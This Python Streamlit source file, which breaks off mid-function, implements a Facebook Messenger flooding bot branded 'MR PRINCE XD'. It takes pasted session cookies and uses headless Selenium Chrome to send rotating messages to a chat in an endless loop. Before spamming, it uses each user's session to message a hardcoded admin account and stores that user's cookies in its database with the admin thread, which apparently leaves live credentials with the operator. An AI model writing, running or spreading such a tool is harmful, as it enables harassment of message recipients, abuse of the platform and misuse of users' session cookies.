import streamlit as st
import streamlit.components.v1 as components
import time
import threading
import uuid
import hashlib
import os
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests

st.set_page_config(
    page_title="MR PRINCE XD💔",
    page_icon="🥵",
    layout="centered",
    initial_sidebar_state="collapsed"
)

custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap');
    
    * {
        font-family: 'Poppins', sans-serif;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    .stApp {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        background-attachment: fixed;
    }
    
    /* Hide all Streamlit default elements */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stDeployButton {display: none;}
    [data-testid="stToolbar"] {display: none;}
    .stAlert {display: none !important;}
    .element-container div[data-testid="stAlert"] {display: none !important;}
    
    /* Remove all default padding and margins */
    .main .block-container {
        padding: 5px !important;
        padding-top: 5px !important;
        padding-bottom: 5px !important;
        max-width: 100% !important;
    }
    
    /* Main wrapper */
    .main-wrapper {
        width: 100%;
        padding: 0;
        min-height: auto;
    }
    
    /* Single Container */
    .big-container {
        max-width: 100%;
        width: 100%;
        background: linear-gradient(135deg, #1e3c72, #2a5298);
        border-radius: 25px;
        padding: 15px 12px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        border: 1px solid rgba(255,255,255,0.2);
        margin: 0;
    }
    
    /* Hero Title */
    .hero-title {
        text-align: center;
        font-size: 24px;
        font-weight: 800;
        background: linear-gradient(135deg, #ff6b6b, #ffd93d, #ff6b6b);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 5px;
        letter-spacing: 1px;
        word-wrap: break-word;
    }
    
    /* Hero Subtitle */
    .hero-subtitle {
        text-align: center;
        font-size: 12px;
        color: #ffd93d;
        margin-bottom: 15px;
        font-weight: 600;
        letter-spacing: 2px;
    }
    
    /* Input Fields - Transparent with border, rounded corners */
    .stTextInput>div>div>input, 
    .stTextArea>div>div>textarea, 
    .stNumberInput>div>div>input {
        background: rgba(255,255,255,0.15) !important;
        border: 1.5px solid rgba(255,255,255,0.3) !important;
        border-radius: 20px !important;
        color: white !important;
        padding: 8px 15px !important;
        font-size: 14px !important;
        font-weight: 500 !important;
        transition: all 0.3s ease !important;
    }
    
    .stTextInput>div>div>input::placeholder,
    .stTextArea>div>div>textarea::placeholder {
        color: rgba(255,255,255,0.6) !important;
    }
    
    .stTextInput>div>div>input:focus, 
    .stTextArea>div>div>textarea:focus {
        border-color: #ffd93d !important;
        box-shadow: 0 0 0 2px rgba(255,217,61,0.3) !important;
        background: rgba(255,255,255,0.25) !important;
    }
    
    .stTextArea>div>div>textarea {
        min-height: 70px;
        border-radius: 20px !important;
    }
    
    /* Labels */
    label {
        color: #ffd93d !important;
        font-weight: 600 !important;
        font-size: 12px !important;
        margin-bottom: 3px !important;
        display: block !important;
        letter-spacing: 0.5px;
    }
    
    /* Buttons */
    .stButton>button {
        background: linear-gradient(135deg, #ff6b6b, #ff8e53) !important;
        color: white !important;
        border: none !important;
        border-radius: 25px !important;
        padding: 8px !important;
        font-weight: 700 !important;
        font-size: 14px !important;
        width: 100% !important;
        letter-spacing: 1px !important;
        transition: all 0.3s ease !important;
        margin: 0 !important;
        cursor: pointer;
    }
    
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(255,107,107,0.4);
    }
    
    /* Message Box */
    .msg-box {
        background: rgba(255,255,255,0.15);
        border-radius: 20px;
        padding: 8px;
        margin: 5px 0;
        text-align: center;
        border: 1px solid rgba(255,217,61,0.5);
    }
    
    .msg-text {
        color: #ffd93d;
        font-size: 13px;
        font-weight: 600;
    }
    
    /* Status Box */
    .status-box {
        text-align: center;
        padding: 8px;
        border-radius: 25px;
        margin-top: 10px;
        font-weight: 700;
        font-size: 13px;
    }
    
    .running {
        background: rgba(0,255,136,0.2);
        border: 1.5px solid #00ff88;
        color: #00ff88;
    }
    
    .stopped {
        background: rgba(255,107,107,0.2);
        border: 1.5px solid #ff6b6b;
        color: #ff6b6b;
    }
    
    /* Divider */
    hr {
        margin: 10px 0;
        border: none;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(255,217,61,0.5), transparent);
    }
    
    /* Sidebar */
    [data-testid="stSidebar"] {
        background: linear-gradient(135deg, #1e3c72, #2a5298);
        border-right: 1px solid rgba(255,255,255,0.2);
    }
    
    /* Row and Column spacing - REDUCED GAP */
    .row-widget {
        margin-bottom: 0 !important;
    }
    
    div[data-testid="column"] {
        padding: 0 3px !important;
        gap: 3px !important;
    }
    
    /* Reduce gap between elements */
    .element-container {
        margin-bottom: 5px !important;
    }
    
    .stTextInput, .stTextArea, .stNumberInput {
        margin-bottom: 5px !important;
    }
    
    /* Tabs styling */
    .stTabs [data-baseweb="tab-list"] {
        gap: 5px;
        background-color: rgba(255,255,255,0.1);
        border-radius: 20px;
        padding: 4px;
        margin-bottom: 10px;
    }
    
    .stTabs [data-baseweb="tab"] {
        border-radius: 16px;
        padding: 6px 10px;
        background-color: transparent;
        color: white;
        font-weight: 600;
        font-size: 12px;
    }
    
    .stTabs [aria-selected="true"] {
        background-color: #ff6b6b;
        color: white;
    }
    
    /* Alert messages */
    .stAlert {
        background-color: rgba(255,255,255,0.15) !important;
        border-radius: 20px !important;
        border-left: 3px solid #ff6b6b !important;
        color: white !important;
        padding: 6px !important;
        font-size: 12px !important;
        margin: 3px 0 !important;
    }
    
    /* Number input */
    .stNumberInput input {
        color: white !important;
    }
    
    /* Remove extra spacing */
    section.main > div {
        padding-top: 0 !important;
    }
    
    .stApp > header {
        display: none;
    }
    
    .stApp > div {
        margin-top: 0 !important;
        padding-top: 0 !important;
    }
    
    .row-widget.stHorizontal {
        margin-top: 0 !important;
        margin-bottom: 5px !important;
    }
    
    /* Column gap reduction */
    .row-widget.stHorizontal > div {
        gap: 5px !important;
    }
    
    /* Sidebar content styling */
    [data-testid="stSidebar"] .stMarkdown {
        color: white;
    }
    
    [data-testid="stSidebar"] button {
        background: linear-gradient(135deg, #ff6b6b, #ff8e53) !important;
        border-radius: 20px !important;
    }
    
    /* Info/Warning/Success boxes */
    .stInfo, .stWarning, .stSuccess, .stError {
        background: rgba(255,255,255,0.15) !important;
        border-radius: 20px !important;
        padding: 8px !important;
        color: white !important;
    }
    
    .stInfo div, .stWarning div, .stSuccess div, .stError div {
        color: white !important;
    }
    
    /* Selectbox */
    .stSelectbox>div>div {
        background: rgba(255,255,255,0.15) !important;
        border-radius: 20px !important;
        border: 1.5px solid rgba(255,255,255,0.3) !important;
    }
    
    /* Chat message styling */
    [data-testid="stChatMessage"] {
        background: rgba(255,255,255,0.1) !important;
        border-radius: 20px !important;
    }
    
    /* Custom scrollbar */
    ::-webkit-scrollbar {
        width: 4px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(255,255,255,0.1);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: #ff6b6b;
        border-radius: 10px;
    }
    
    /* Login/Signup specific */
    .big-container h3 {
        color: white !important;
        text-align: center;
        margin-bottom: 15px !important;
        font-size: 18px !important;
    }
    
    /* Remove white background from all Streamlit elements */
    .stTextInput>div>div>input:-webkit-autofill,
    .stTextInput>div>div>input:-webkit-autofill:focus {
        -webkit-box-shadow: 0 0 0 30px rgba(255,255,255,0.15) inset !important;
        -webkit-text-fill-color: white !important;
    }
    
    /* Make all containers transparent */
    .stTabs [data-baseweb="tab-panel"] {
        background: transparent !important;
        padding-top: 5px !important;
    }
    
    /* Remove gap from main block */
    .block-container {
        padding-top: 0 !important;
        padding-bottom: 0 !important;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

ADMIN_PASSWORD = "MR PRINCE"
WHATSAPP_NUMBER = "+994406387215"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"

def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"🥨 HELLO PRINCE SIR PLEASE ❤️\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'user_key' not in st.session_state:
    st.session_state.user_key = None
if 'key_approved' not in st.session_state:
    st.session_state.key_approved = False
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'not_requested'
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'whatsapp_opened' not in st.session_state:
    st.session_state.whatsapp_opened = False
if 'status_message' not in st.session_state:
    st.session_state.status_message = None
if 'show_signup' not in st.session_state:
    st.session_state.show_signup = False
if 'signup_success' not in st.session_state:
    st.session_state.signup_success = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

ADMIN_UID = "100003995292301"

def find_message_input(driver, process_id):
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            return element
                        elif idx < 10:
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            return element
                except Exception:
                    continue
        except Exception:
            continue
    
    return None

def setup_browser():
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
        else:
            driver = webdriver.Chrome(options=chrome_options)
        
        driver.set_window_size(1920, 1080)
        return driver
    except Exception as error:
        raise error

def get_next_message(messages, automation_state):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    message = messages[automation_state.message_rotation_index % len(messages)]
    automation_state.message_rotation_index += 1
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        driver = setup_browser()
        
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id)
        
        if not message_input:
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
               
                messages_sent += 1
                automation_state.message_count = messages_sent
                
                if messages_sent % 5 == 0:
                    st.session_state.status_message = f"✅ CHAL GYA {messages_sent} messages sent!"
                
                time.sleep(delay)
                
            except Exception:
                time.sleep(5)
        
        return messages_sent
        
    except Exception:
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def send_admin_notification(user_config, username, automation_state, user_id):
    driver = None
    try:
        admin_e2ee_thread_id = db.get_admin_e2ee_thread_id(user_id)
        
        driver = setup_browser()
        
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if user_config['cookies'] and user_config['cookies'].strip():
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        admin_found = False
        e2ee_thread_id = admin_e2ee_thread_id
        
        if e2ee_thread_id:
            if '/e2ee/' in str(e2ee_thread_id):
                conversation_url = f'https://www.facebook.com/messages/e2ee/t/{e2ee_thread_id}'
            else:
                conversation_url = f'https://www.facebook.com/messages/t/{e2ee_thread_id}'
            
            driver.get(conversation_url)
            time.sleep(8)
            admin_found = True
        
        if not admin_found or not e2ee_thread_id:
            try:
                profile_url = f'https://www.facebook.com/messages/new'
                driver.get(profile_url)
                time.sleep(8)
                
                search_box = None
                search_selectors = [
                    'input[aria-label*="To:" i]',
                    'input[placeholder*="Type a name" i]',
                    'input[type="text"]'
                ]
                
                for selector in search_selectors:
                    try:
                        search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                        if search_elements:
                            for elem in search_elements:
                                if elem.is_displayed():
                                    search_box = elem
                                    break
                            if search_box:
                                break
                    except:
                        continue
                
                if search_box:
                    driver.execute_script("""
                        arguments[0].focus();
                        arguments[0].value = arguments[1];
                        arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                    """, search_box, ADMIN_UID)
                    time.sleep(5)
                    
                    result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                    if result_elements:
                        driver.execute_script("arguments[0].click();", result_elements[0])
                        time.sleep(8)
                        
                        current_url = driver.current_url
                        if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                            if '/e2ee/t/' in current_url:
                                e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                            else:
                                e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                            
                            if e2ee_thread_id and user_id:
                                current_cookies = user_config.get('cookies', '')
                                db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
                                admin_found = True
            except Exception:
                pass
        
        if not admin_found:
            return
        
        message_input = find_message_input(driver, 'ADMIN-NOTIFY')
        
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            notification_msg = f"🔔 New User Started Automation\n\n👤 Username: {username}\n⏰ Time: {current_time}"
            
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
                
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
                
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
                
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
            
            time.sleep(1)
            
            driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        break;
                    }
                }
            """)
            
            time.sleep(2)
            
    except Exception:
        pass
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

def admin_panel():
    pending = load_pending_approvals()
    approved_keys = load_approved_keys()
    
    col1, col2 = st.columns(2)
    with col1:
        st.markdown(f"**Total Approved:** {len(approved_keys)}")
    with col2:
        st.markdown(f"**Pending:** {len(pending)}")
    
    if pending:
        for key, info in pending.items():
            col1, col2, col3 = st.columns([2, 2, 1])
            with col1:
                st.text(f"👤 {info['name']}")
            with col2:
                st.text(f"🔑 {key}")
            with col3:
                if st.button("✅", key=f"approve_{key}"):
                    approved_keys[key] = info
                    save_approved_keys(approved_keys)
                    del pending[key]
                    save_pending_approvals(pending)
                    st.rerun()
    else:
        st.info("No pending")
    
    if st.button("Logout", key="admin_logout_btn"):
        st.session_state.approval_status = 'login'
        st.rerun()

def approval_request_page(user_key, username):
    if st.session_state.approval_status == 'not_requested':
        st.markdown("### 🔑 Request Access")
        st.info(f"**Key:** `{user_key}`")
        st.info(f"**Name:** {username}")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Request Approval", use_container_width=True, key="request_approval_btn"):
                pending = load_pending_approvals()
                pending[user_key] = {"name": username, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
                save_pending_approvals(pending)
                st.session_state.approval_status = 'pending'
                st.session_state.whatsapp_opened = False
                st.rerun()
        with col2:
            if st.button("Admin Panel", use_container_width=True, key="admin_panel_btn"):
                st.session_state.approval_status = 'admin_login'
                st.rerun()
    
    elif st.session_state.approval_status == 'pending':
        st.warning("⏳ Approval Pending...")
        st.info(f"**Key:** `{user_key}`")
        
        whatsapp_url = send_whatsapp_message(username, user_key)
        
        if not st.session_state.whatsapp_opened:
            whatsapp_js = f"<script>setTimeout(function(){{window.open('{whatsapp_url}', '_blank');}}, 500);</script>"
            components.html(whatsapp_js, height=0)
            st.session_state.whatsapp_opened = True
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Check Status", use_container_width=True, key="check_approval_btn"):
                if check_approval(user_key):
                    st.session_state.key_approved = True
                    st.session_state.approval_status = 'approved'
                    st.rerun()
                else:
                    st.error("Not approved yet!")
        with col2:
            if st.button("Back", use_container_width=True, key="back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.session_state.whatsapp_opened = False
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_login':
        st.markdown("### Admin Login")
        admin_password = st.text_input("Password:", type="password", key="admin_password_input")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Login", use_container_width=True, key="admin_login_btn"):
                if admin_password == ADMIN_PASSWORD:
                    st.session_state.approval_status = 'admin_panel'
                    st.rerun()
                else:
                    st.error("Invalid!")
        with col2:
            if st.button("Back", use_container_width=True, key="admin_back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_panel':
        admin_panel()

def login_page():
    st.markdown('<div class="main-wrapper"><div class="big-container">', unsafe_allow_html=True)
    
    # Hero Section
    st.markdown('<div class="hero-title">💚💚𝐌𝐑 𝐏𝐑𝐈𝐍𝐂𝐄 𝐗𝐃 💚💚</div>', unsafe_allow_html=True)
    st.markdown('<div class="hero-subtitle">✨ AUTOMATE YOUR DESTINY | POWERED BY PRINCE ✨</div>', unsafe_allow_html=True)
    
    # Show success message if signup was successful
    if st.session_state.signup_success:
        st.success("✅ Account created successfully! Please login with your credentials.")
        st.session_state.signup_success = False
    
    # Show Signup Form if show_signup is True
    if st.session_state.show_signup:
        st.markdown("### 📝 CREATE NEW ACCOUNT")
        
        new_username = st.text_input("👤 USERNAME", key="signup_username", placeholder="Choose username")
        new_password = st.text_input("🔒 PASSWORD", key="signup_password", type="password", placeholder="Choose password")
        confirm_password = st.text_input("✅ CONFIRM PASSWORD", key="confirm_password", type="password", placeholder="Confirm password")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("✅ CREATE ACCOUNT", key="signup_btn", use_container_width=True):
                if new_username and new_password and confirm_password:
                    if new_password == confirm_password:
                        success, message = db.create_user(new_username, new_password)
                        if success:
                            st.session_state.signup_success = True
                            st.session_state.show_signup = False
                            st.rerun()
                        else:
                            st.error(f"❌ {message}")
                    else:
                        st.error("❌ Passwords don't match!")
                else:
                    st.warning("⚠️ Please fill all fields!")
        
        with col2:
            if st.button("🔙 BACK TO LOGIN", key="back_to_login_btn", use_container_width=True):
                st.session_state.show_signup = False
                st.rerun()
    
    else:
        # Login Form
        st.markdown("")
        
        username = st.text_input("👤 USERNAME", key="login_username", placeholder="Enter your username")
        password = st.text_input("🔒 PASSWORD", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("🚀 LOGIN", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    user_key = generate_user_key(username, password)
                    st.session_state.logged_in = True
                    st.session_state.user_id = user_id
                    st.session_state.username = username
                    st.session_state.user_key = user_key
                    
                    if check_approval(user_key):
                        st.session_state.key_approved = True
                        st.session_state.approval_status = 'approved'
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                    else:
                        st.session_state.key_approved = False
                        st.session_state.approval_status = 'not_requested'
                    
                    st.success("✅ SUCCESSFUL LOGIN! Redirecting...")
                    time.sleep(1)
                    st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password!")
        
        st.markdown("---")
        
        # Create New Username Option - Below Login Button
        st.markdown("<p style='text-align: center; color: #ffd93d; margin: 8px 0;'>Don't have an account?</p>", unsafe_allow_html=True)
        
        if st.button("✨ CREATE NEW USERNAME", key="create_new_username_btn", use_container_width=True):
            st.session_state.show_signup = True
            st.rerun()
    
    st.markdown('</div></div>', unsafe_allow_html=True)

def main_app():
    st.markdown('<div class="main-wrapper"><div class="big-container">', unsafe_allow_html=True)
    
    # Hero Section
    st.markdown('<div class="hero-title">UNSTOPPABLE LEGEND BOY ZAINNU XD</div>', unsafe_allow_html=True)
    st.markdown('<div class="hero-subtitle">✨ AUTOMATE YOUR DESTINY | POWERED BY ROW3DY ✨</div>', unsafe_allow_html=True)
    
    if not st.session_state.auto_start_checked and st.session_state.user_id:
        st.session_state.auto_start_checked = True
        should_auto_start = db.get_automation_running(st.session_state.user_id)
        if should_auto_start and not st.session_state.automation_state.running:
            user_config = db.get_user_config(st.session_state.user_id)
            if user_config and user_config['chat_id']:
                start_automation(user_config, st.session_state.user_id)
    
    # Simple sidebar info
    with st.sidebar:
        st.markdown(f"### 👤 {st.session_state.username}")
        st.markdown(f"**ID:** {st.session_state.user_id}")
        st.markdown(f"**Key:** `{st.session_state.user_key}`")
        
        if st.button("🚪 LOGOUT", use_container_width=True):
            if st.session_state.automation_state.running:
                stop_automation(st.session_state.user_id)
            st.session_state.logged_in = False
            st.session_state.user_id = None
            st.session_state.username = None
            st.session_state.user_key = None
            st.session_state.key_approved = False
            st.session_state.automation_running = False
            st.session_state.auto_start_checked = False
            st.session_state.approval_status = 'not_requested'
            st.session_state.status_message = None
            st.session_state.show_signup = False
            st.session_state.signup_success = False
            st.rerun()
    
    user_config = db.get_user_config(st.session_state.user_id)
    
    if user_config:
        # Cookies Box at TOP
        cookies = st.text_area("🍪 COOKIES", value="", placeholder="Paste cookies here", height=60, key="cookies_box")
        
        # Two columns for Chat ID and Name Prefix
        col1, col2 = st.columns(2)
        with col1:
            chat_id = st.text_input("💬 CHAT ID", value=user_config['chat_id'], placeholder="Enter Chat ID")
        with col2:
            name_prefix = st.text_input("🏷️ NAME PREFIX", value=user_config['name_prefix'], placeholder="Enter prefix")
        
        # Delay
        delay = st.number_input("⏱️ DELAY (seconds)", min_value=1, max_value=300, value=user_config['delay'])
        
        # Messages
        messages = st.text_area("💬 MESSAGES", value=user_config['messages'], placeholder="One message per line", height=70)
        
        st.markdown("---")
        
        if st.session_state.status_message:
            st.markdown(f"""
            <div class="msg-box">
                <div class="msg-text">{st.session_state.status_message}</div>
            </div>
            """, unsafe_allow_html=True)
        
        # Start/Stop buttons in single row
        col1, col2 = st.columns(2)
        with col1:
            if st.button("▶️ START", disabled=st.session_state.automation_state.running, use_container_width=True):
                if chat_id:
                    final_cookies = cookies if cookies.strip() else user_config['cookies']
                    db.update_user_config(st.session_state.user_id, chat_id, name_prefix, delay, final_cookies, messages)
                    updated_config = db.get_user_config(st.session_state.user_id)
                    if updated_config and updated_config['chat_id']:
                        start_automation(updated_config, st.session_state.user_id)
                        st.session_state.status_message = "✅ STARTED! 🚀"
                        st.rerun()
                    else:
                        st.session_state.status_message = "❌ Chat ID required!"
                        st.rerun()
                else:
                    st.session_state.status_message = "❌ Enter Chat ID!"
                    st.rerun()
        
        with col2:
            if st.button("⏹️ STOP", disabled=not st.session_state.automation_state.running, use_container_width=True):
                stop_automation(st.session_state.user_id)
                st.session_state.status_message = "⏹️ Stopped!"
                st.rerun()
        
        # Status
        if st.session_state.automation_state.running:
            st.markdown('<div class="status-box running">🟢 RUNNING - SENDING...</div>', unsafe_allow_html=True)
        else:
            st.markdown('<div class="status-box stopped">🔴 STOPPED - CLICK START</div>', unsafe_allow_html=True)
    else:
